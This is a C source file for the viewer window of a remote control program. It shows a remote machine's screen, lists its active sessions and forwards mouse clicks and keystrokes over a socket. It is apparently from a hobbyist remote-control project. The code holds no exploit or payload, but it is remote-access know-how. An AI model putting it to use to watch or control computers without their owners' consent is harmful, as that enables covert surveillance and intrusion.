/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "m_frame_screen.h"
#include "km_socket.h"
#include "frame_tools.h"

char frame_cls_screen[] = "cls_screen";
extern  HINSTANCE   hInst;
unsigned long screen_exe_crc = 0;

int screen_tool(HWND hWnd,pm_frame_screen pm_f_screen)
{
    pm_f_screen->hTool = CreateWindowEx(0, TOOLBARCLASSNAME, NULL, WS_VISIBLE|WS_CHILD|WS_BORDER| TBSTYLE_WRAPABLE | CCS_ADJUSTABLE, 0, 0, 0, 0, hWnd, (HMENU)IDR_TOOLBAR4, hInst, NULL);

    pm_f_screen->hCombox = CreateWindowEx(0, WC_COMBOBOX, NULL, WS_VISIBLE|WS_CHILD|CBS_SIMPLE|CBS_DROPDOWN|CBS_DROPDOWNLIST|CBS_SORT|WS_VSCROLL, 0, 0, 80, 100, pm_f_screen->hTool, (HMENU)IDR_COMBOEX, hInst, NULL);

    pm_f_screen->hReCombox = CreateWindowEx(0, WC_BUTTON, "刷新", WS_VISIBLE|WS_CHILD, 84, 1, 72, 22, pm_f_screen->hTool,(HMENU)IDR_COM_RE_COUNT, hInst, NULL);

    pm_f_screen->hCtrlShiftDel = CreateWindowEx(0, WC_BUTTON, "Ctrl+Shift+Delete", WS_VISIBLE|WS_CHILD, 162, 1, 160, 22, pm_f_screen->hTool,(HMENU)IDR_COM_CTRLSHIFTDEL, hInst, NULL);
    pm_f_screen->hSendKey = CreateWindowEx(0, WC_BUTTON, "键盘", WS_VISIBLE|WS_CHILD|BS_CHECKBOX, 332, 2, 50, 22, pm_f_screen->hTool,(HMENU)IDR_COM_SENDKEY, hInst, NULL);
    pm_f_screen->hSendMouse = CreateWindowEx(0, WC_BUTTON, "鼠标", WS_VISIBLE|WS_CHILD|BS_CHECKBOX, 390, 2, 50, 22, pm_f_screen->hTool,(HMENU)IDR_COM_SENDMOUSE, hInst, NULL);
    pm_f_screen->hStartStop = CreateWindowEx(0, WC_BUTTON, "开始", WS_VISIBLE|WS_CHILD, 442, 1, 80, 22, pm_f_screen->hTool,(HMENU)IDR_COM_STARTSTOP, hInst, NULL);
    pm_f_screen->hImage = CreateWindowEx(0, WC_BUTTON, "拍照", WS_VISIBLE|WS_CHILD, 524, 1, 80, 22, pm_f_screen->hTool,(HMENU)IDR_COM_IMAGE, hInst, NULL);

    //SetWindowFont(pm_frame_screen->hCombox);
    SetWindowFont(pm_f_screen->hReCombox);
    SetWindowFont(pm_f_screen->hCtrlShiftDel);
    SetWindowFont(pm_f_screen->hSendKey);
    SetWindowFont(pm_f_screen->hSendMouse);
    SetWindowFont(pm_f_screen->hStartStop);
    SetWindowFont(pm_f_screen->hImage);

    EnableWindow(pm_f_screen->hCtrlShiftDel, FALSE);
    EnableWindow(pm_f_screen->hSendKey, FALSE);
    EnableWindow(pm_f_screen->hSendMouse, FALSE);
    return 0;
}

int initialize_frame_screen()
{
    WNDCLASSEX wcx;
    wcx.cbSize          = sizeof(WNDCLASSEX);
    wcx.style           = 0;//CS_HREDRAW | CS_VREDRAW;
    wcx.cbClsExtra      = 0;
    wcx.cbWndExtra      = 0;
    wcx.hInstance       = hInst;
    wcx.hIcon           = LoadIcon(NULL,IDI_APPLICATION);
    wcx.hIconSm         = NULL;
    wcx.hCursor         = LoadCursor(NULL,IDC_ARROW);
    wcx.hbrBackground   = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wcx.lpszMenuName    = NULL;
    wcx.lpszClassName   = frame_cls_screen;
    wcx.lpfnWndProc     = frame_screen;

    if (!RegisterClassEx(&wcx))
        return -1;
    return 0;
}

int frame_screen_bt_event(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    pio_socket            pi_socket  = NULL;
    pkm_client            pclient     = NULL;
    pm_frame_screen       pm_f_screen = NULL;

    pi_socket = get_frame_io_socket(hWnd);
    if (!pi_socket)
        return 0;

    pclient     = (pkm_client)pi_socket->extend;
    pm_f_screen = &pclient->frame_screen;

    switch(Message)
    {
    case IDR_COM_CTRLSHIFTDEL:
        break;
    case IDR_COM_IMAGE:
        pm_f_screen->isImage = 1;
        break;
    case IDR_COM_SENDKEY:
        {
            (pm_f_screen->isSendKey == 0) ? (pm_f_screen->isSendKey = 1) : (pm_f_screen->isSendKey = 0);
            SendMessage(pm_f_screen->hSendKey, BM_SETCHECK, pm_f_screen->isSendKey, 0);
            SetFocus(hWnd);
        }
        break;
    case IDR_COM_SENDMOUSE:
        {
            (pm_f_screen->isSendMouse == 0) ? (pm_f_screen->isSendMouse = 1) : (pm_f_screen->isSendMouse = 0);
            SendMessage(pm_f_screen->hSendMouse, BM_SETCHECK, pm_f_screen->isSendMouse, 0);
            SetFocus(hWnd);
        }
        break;
    case IDR_COM_RE_COUNT:
        {
            kms_sock_send(pi_socket, 3, 6, 0, NULL, 0);
            SetFocus(hWnd);
        }
        break;
    case IDR_COM_STARTSTOP:
        {
            int index;
            char temp[32] = {0};
            char screen[64] = {0};
            if (pm_f_screen->hStartStop_State == 0) {
                index = SendMessage(pm_f_screen->hCombox, CB_GETCURSEL, 0, 0L);
                if (index == -1)
                    break;
                SendMessage(pm_f_screen->hCombox, CB_GETLBTEXT, index, (LPARAM)temp);
                //MessageBox(NULL, temp, 0, 0);
                pm_f_screen->hStartStop_State = 1;

                SetWindowText(pm_f_screen->hStartStop, "停止");
                EnableWindow(pm_f_screen->hCombox,FALSE);
                EnableWindow(pm_f_screen->hReCombox,FALSE);
                EnableWindow(pm_f_screen->hCtrlShiftDel, TRUE);
                EnableWindow(pm_f_screen->hSendKey, TRUE);
                EnableWindow(pm_f_screen->hSendMouse, TRUE);

                sprintf(screen, "%s:%x", temp, (int)screen_exe_crc);
                kms_sock_send(pi_socket, 3, 0, (unsigned long)pi_socket->extend, screen, strlen(screen));
            } else {
                pm_f_screen->hStartStop_State = 0;
                SetWindowText(pm_f_screen->hStartStop, "开始");
                EnableWindow(pm_f_screen->hCombox,TRUE);
                EnableWindow(pm_f_screen->hReCombox,TRUE);
                EnableWindow(pm_f_screen->hCtrlShiftDel, FALSE);
                EnableWindow(pm_f_screen->hSendKey, FALSE);
                EnableWindow(pm_f_screen->hSendMouse, FALSE);

                pm_f_screen->isSendKey = 0;
                SendMessage(pm_f_screen->hSendKey, BM_SETCHECK, pm_f_screen->isSendKey, 0);

                pm_f_screen->isSendMouse = 0;
                SendMessage(pm_f_screen->hSendMouse, BM_SETCHECK, pm_f_screen->isSendKey, 0);
            }
            SetFocus(hWnd);
        }
        break;
    }

    return 1;
}

LRESULT __stdcall frame_screen(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)
{
    pio_socket pi_socket;
    pkm_client pclient     = NULL;
    pm_frame_screen pm_f_screen;
    switch(Message)
    {
    case WM_CREATE:
        {
            int x = (GetSystemMetrics(SM_CXSCREEN)-1024)/2;
            int y = (GetSystemMetrics(SM_CYSCREEN)-768)/2;
            MoveWindow(hWnd, x, y, 1024, 768, TRUE);
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                screen_tool(hWnd,&pclient->frame_screen);
                pclient->frame_screen.hStartStop_State = 0;
            }
        }
        break;
    case WM_COMMAND:
        {
            int iWmId    = LOWORD(wParam);
            //int iWmEvent = HIWORD(wParam);
            frame_screen_bt_event(hWnd, iWmId, wParam, lParam);
        }
        break;
    case WM_R_SCREEN:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                pm_f_screen = &pclient->frame_screen;

                if (pm_f_screen->i_length == 0)
                    break;

                int color = (1<<((LPBITMAPINFOHEADER)pm_f_screen->i_buffer)->biBitCount);
                if (color>256)
                    color = 0;

                HDC hdc = GetDC(pm_f_screen->hWnd);
                RECT rect,htool;
                GetClientRect(pm_f_screen->hTool,&htool);
                GetClientRect(pm_f_screen->hWnd,&rect);
               // BitBlt(hDC, -g_sih.nPos + 1, -g_siv.nPos + 1, g_size.cx, g_size.cy, hMemDC, 0, 0, SRCCOPY);
                //StretchDIBits(hdc, 0, htool.bottom+3, rect.right, rect.bottom-htool.bottom-2,
                StretchDIBits(hdc, -pm_f_screen->g_sih.nPos + 1, -pm_f_screen->g_siv.nPos + htool.bottom + 4,
                                    pm_f_screen->g_size.cx, pm_f_screen->g_size.cy - htool.bottom - 2,
                    0,0,
                    ((LPBITMAPINFOHEADER)pm_f_screen->i_buffer)->biWidth,
                    ((LPBITMAPINFOHEADER)pm_f_screen->i_buffer)->biHeight,
                    (LPBYTE)pm_f_screen->i_buffer+(sizeof(BITMAPINFOHEADER)+color*sizeof(RGBQUAD)),
                    (LPBITMAPINFO)pm_f_screen->i_buffer,DIB_RGB_COLORS, SRCCOPY);
                ReleaseDC(pm_f_screen->hWnd,hdc);
            }
        }
        break;
    case WM_R_SCREEN_COUNT:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                char temp[32];
                pclient = (pkm_client)pi_socket->extend;
                pm_f_screen = &pclient->frame_screen;
                int i=0,count;
                count = SendMessage(pm_f_screen->hCombox, CB_GETCOUNT, 0L, 0L);
                for (i=0; i<count; i++)
                    SendMessage(pm_f_screen->hCombox, CB_DELETESTRING, 0, 0L);

                PWTS_SESSION_INFO p_session_info = pm_f_screen->psession_info;
                for (i=0; i<pm_f_screen->session_info_count; i++) {
                    if (p_session_info[i].State == WTSActive) {
                        //sprintf(temp, "winsta%d", (int)p_session_info[i].SessionId);
                        sprintf(temp, "%d", (int)p_session_info[i].SessionId);
                        SendMessage(pm_f_screen->hCombox, CB_ADDSTRING, 0, (DWORD)temp);
                    }
                }
                SendMessage(pm_f_screen->hCombox, CB_SETCURSEL, 0, 0);

            }
        }
        break;
    case WM_MOUSEMOVE:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                pm_f_screen = &pclient->frame_screen;

                POINT ptCursor = { LOWORD(lParam), HIWORD(lParam) };
                ptCursor.y = ptCursor.y - 29 ;
                ptCursor.x = ptCursor.x - -pm_f_screen->g_sih.nPos - 1;
                ptCursor.y = ptCursor.y - -pm_f_screen->g_siv.nPos;
                pclient->frame_screen.point.x = ptCursor.x;
                pclient->frame_screen.point.y = ptCursor.y;
            }
        }
        break;
    case WM_LBUTTONDOWN:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                if (pclient->frame_screen.isSendMouse && pclient->frame_screen.hStartStop_State) {
                    kms_sock_send(pclient->frame_screen.i_socket, 3, 3, 0, (char*)&pclient->frame_screen.point, sizeof(POINT));
                }
            }
        }
        break;
    case WM_RBUTTONDOWN:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                if (pclient->frame_screen.isSendMouse && pclient->frame_screen.hStartStop_State) {
                    kms_sock_send(pclient->frame_screen.i_socket, 3, 4, 0, (char*)&pclient->frame_screen.point, sizeof(POINT));
                }
            }
        }
        break;
   /* case WM_LBUTTONUP:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                if (pclient->frame_screen.isSendMouse && pclient->frame_screen.hStartStop_State) {
                    kms_sock_send(pclient->frame_screen.i_socket, 3, 7, 0, (char*)&pclient->frame_screen.point, sizeof(POINT));
                }
            }
        }
        break;
    case WM_RBUTTONUP:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                if (pclient->frame_screen.isSendMouse && pclient->frame_screen.hStartStop_State) {
                    kms_sock_send(pclient->frame_screen.i_socket, 3, 8, 0, (char*)&pclient->frame_screen.point, sizeof(POINT));
                }
            }
        }
        break;*/
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                pclient = (pkm_client)pi_socket->extend;
                if (pclient->frame_screen.isSendKey && pclient->frame_screen.hStartStop_State) {
                    kms_sock_send(pclient->frame_screen.i_socket, 3, 5, (unsigned long)(char)wParam, NULL, 0);
                }
            }
        }
        break;
    case WM_SIZE:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket) {
                RECT rect;
                pclient = (pkm_client)pi_socket->extend;

                GetWindowRect(hWnd, &rect);

                int xcx ,cx = xcx = (int)(short)LOWORD(lParam);
                int xcy ,cy = xcy = (int)(short)HIWORD(lParam);

                pclient->frame_screen.g_sih.nPage    = pclient->frame_screen.g_sih.nMax * ((FLOAT)cx / pclient->frame_screen.g_size.cx);
                pclient->frame_screen.g_siv.nPage    = pclient->frame_screen.g_siv.nMax * ((FLOAT)cy / pclient->frame_screen.g_size.cy);

                if ((cx = pclient->frame_screen.g_sih.nMax - cx + 1) < pclient->frame_screen.g_sih.nPos)
                    pclient->frame_screen.g_sih.nPos = cx < 0 ? 0 : cx;
                if ((cy = pclient->frame_screen.g_siv.nMax - cy + 1) < pclient->frame_screen.g_siv.nPos)
                    pclient->frame_screen.g_siv.nPos = cy < 0 ? 0 : cy;

                SetScrollInfo(hWnd, SB_HORZ, &pclient->frame_screen.g_sih, TRUE);
                SetScrollInfo(hWnd, SB_VERT, &pclient->frame_screen.g_siv, TRUE);

                HDWP hDwp;
                hDwp  = BeginDeferWindowPos(1);
                DeferWindowPos(hDwp, pclient->frame_screen.hTool, NULL, 0, 0, 0, 0, SWP_NOZORDER);
                EndDeferWindowPos(hDwp);

                if (xcx > (pclient->frame_screen.g_size.cx)) {
                    MoveWindow(hWnd, rect.left, rect.top, pclient->frame_screen.g_size.cx+8, xcy+45, TRUE);
                    break;
                }
                if (xcy > (pclient->frame_screen.g_size.cy)) {
                    MoveWindow(hWnd, rect.left, rect.top, xcx+8, pclient->frame_screen.g_size.cy+45, TRUE);
                }
            }
        }
        break;
    case WM_HSCROLL:
        {
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket == NULL)
                break;
            pclient = (pkm_client)pi_socket->extend;
            int dx = 0;
            UINT code = (UINT)LOWORD(wParam);
            int pos = (int)(short)HIWORD(wParam);
            switch (code) {
                case SB_LINEUP: dx = -10; break;
                case SB_LINEDOWN: dx = 10; break;
                case SB_PAGEUP: dx = 0 - pclient->frame_screen.g_sih.nPage; break;
                case SB_PAGEDOWN: dx = pclient->frame_screen.g_sih.nPage; break;
                case SB_THUMBTRACK: dx = pos - pclient->frame_screen.g_sih.nPos; break;
            }
            if (dx = max(0 - pclient->frame_screen.g_sih.nPos, min(dx, pclient->frame_screen.g_sih.nMax - pclient->frame_screen.g_sih.nPos))) {
                pclient->frame_screen.g_sih.nPos += dx;
                if (pclient->frame_screen.g_sih.nPos > pclient->frame_screen.g_sih.nMax - pclient->frame_screen.g_sih.nPage)
                    pclient->frame_screen.g_sih.nPos = pclient->frame_screen.g_sih.nMax - pclient->frame_screen.g_sih.nPage + 1;
                SetScrollInfo(hWnd, SB_HORZ, &pclient->frame_screen.g_sih, TRUE);
                SendMessage(hWnd, WM_R_SCREEN, 0, 0);
            }
        }
        break;
    case WM_VSCROLL:
        {
            INT dy = 0;
            pi_socket = get_frame_io_socket(hWnd);
            if (pi_socket == NULL)
                break;
            pclient = (pkm_client)pi_socket->extend;
            UINT code = (UINT)LOWORD(wParam);
            int pos = (int)(short)HIWORD(wParam);

            switch (code) {
                case SB_LINEUP: dy = -10; break;
                case SB_LINEDOWN: dy = 10; break;
                case SB_PAGEUP: dy = 0 - pclient->frame_screen.g_siv.nPage; break;
                case SB_PAGEDOWN: dy = pclient->frame_screen.g_siv.nPage; break;
                case SB_THUMBTRACK: dy = pos - pclient->frame_screen.g_siv.nPos; break;
            }
            if (dy = max(0 - pclient->frame_screen.g_siv.nPos, min(dy, pclient->frame_screen.g_siv.nMax - pclient->frame_screen.g_siv.nPos))) {
                pclient->frame_screen.g_siv.nPos += dy;
                if (pclient->frame_screen.g_siv.nPos > pclient->frame_screen.g_siv.nMax - pclient->frame_screen.g_siv.nPage)
                    pclient->frame_screen.g_siv.nPos = pclient->frame_screen.g_siv.nMax - pclient->frame_screen.g_siv.nPage + 1;
                SetScrollInfo(hWnd, SB_VERT, &pclient->frame_screen.g_siv, TRUE);
                SendMessage(hWnd, WM_R_SCREEN, 0, 0);
            }

        }
        break;
    case WM_DESTROY:
    case WM_CLOSE:
        pi_socket = get_frame_io_socket(hWnd);
        if (pi_socket) {
            pclient = (pkm_client)pi_socket->extend;
            pm_f_screen = &pclient->frame_screen;
            pm_f_screen->hWnd = NULL;
            pm_f_screen->hStartStop_State = 0;
            destroy_frame_screen(pi_socket);
        }
        DestroyWindow(hWnd);
        break;
    }
    return DefWindowProc(hWnd,Message,wParam,lParam);
}

int frame_screen_xy(pm_frame_screen pframe_screen, int x, int y)
{
    pframe_screen->g_sih.cbSize    = pframe_screen->g_siv.cbSize   = sizeof(SCROLLINFO);
    pframe_screen->g_sih.fMask     = pframe_screen->g_siv.fMask    = SIF_PAGE | SIF_POS | SIF_RANGE;
    pframe_screen->g_sih.nMax      = x;
    pframe_screen->g_siv.nMax      = y;

    pframe_screen->g_size.cx = x +2;
    pframe_screen->g_size.cy = y + 29;
    return 0;
}

int create_frame_screen(HWND hWndRoot, pio_socket i_socket)
{
    char title[64];
    pkm_client pclient = (pkm_client)i_socket->extend;
    pclient_info pc_info = &pclient->c_info;
    pm_frame_screen pframe_screen = (pm_frame_screen)&pclient->frame_screen;

    kms_sock_send(i_socket, 3, 6, 0, NULL, 0);

    frame_screen_xy(pframe_screen, pc_info->wXscreen, pc_info->wYscreen);

    if (pframe_screen->hWnd == NULL) {
        sprintf(title,"%s@%d", inet_ntoa(i_socket->remote_addr.sin_addr), (int)i_socket);
        pframe_screen->hWnd = CreateWindowEx(0, frame_cls_screen, title, WS_OVERLAPPEDWINDOW|WS_CLIPCHILDREN, 0, 0, 500, 400, hWndRoot, NULL, hInst, (LPVOID)i_socket);
    }

    PostMessage(pframe_screen->hWnd, WM_R_SCREEN, 0, 0);

    UpdateWindow(pframe_screen->hWnd);
    ShowWindow(pframe_screen->hWnd, SW_SHOW);
    return 0;
}

int free_frame_screen(pio_socket i_socket)
{
    pkm_client pclient = (pkm_client)i_socket->extend;

    if (pclient->frame_screen.hStartStop_State != 0) {
        SendMessage(pclient->frame_screen.hWnd, WM_COMMAND, IDR_COM_STARTSTOP, 0);
    }

    //destroy_frame_screen(i_socket);
    return 0;
}

int destroy_frame_screen(pio_socket i_socket)
{
    pkm_client pclient = (pkm_client)i_socket->extend;
    SendMessage(pclient->frame_screen.hWnd, WM_CLOSE, 0, 0);
    if (pclient->frame_screen.i_length > 0) {
        pclient->frame_screen.i_length = 0;
        free(pclient->frame_screen.i_buffer);
    }
    if (pclient->frame_screen.psession_info != NULL) {
        free(pclient->frame_screen.psession_info);
        pclient->frame_screen.psession_info = NULL;
    }
    return 0;
}
